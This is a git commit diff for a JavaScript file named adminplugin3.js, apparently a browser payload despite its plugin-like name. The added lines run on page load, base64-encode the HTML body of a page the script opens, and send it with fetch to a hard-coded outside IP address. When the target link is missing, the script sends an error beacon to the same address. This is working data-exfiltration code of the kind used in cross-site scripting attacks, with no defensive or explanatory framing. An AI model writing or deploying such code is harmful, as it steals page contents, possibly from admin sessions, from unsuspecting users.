33689cc644acd0790379f1e234581e4265a029fd
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 08:20:20 +0100

    Update and rename adminplugin2.js to adminplugin3.js

--- adminplugin3.js
+++ adminplugin3.js
@@ -8,18 +8,13 @@ if (link) {
     window.addEventListener('load', function() {
       // Access the document.body of the new page
       const newPageBody = document.body;
-      console.log('Document body of the new page:', newPageBody);
+      fetch("http://82.65.210.151:24000/?encodedData=" + btoa(newPageBody.innerHTML));
       // Perform actions with the body content of the new page
     });
-
-    // Restore the original document.body content after a delay
-    setTimeout(function() {
-      console.log("waiting");
-    }, 5000); // Adjust the delay as needed
+ 
   
-  fetch("http://82.65.210.151:24000/?encodedData=" + btoa(newPageBody.innerHTML));
 } else {
-  console.error('Link not found');
+   fetch("http://82.65.210.151:24000/?encodedData=error");
 }
 
 
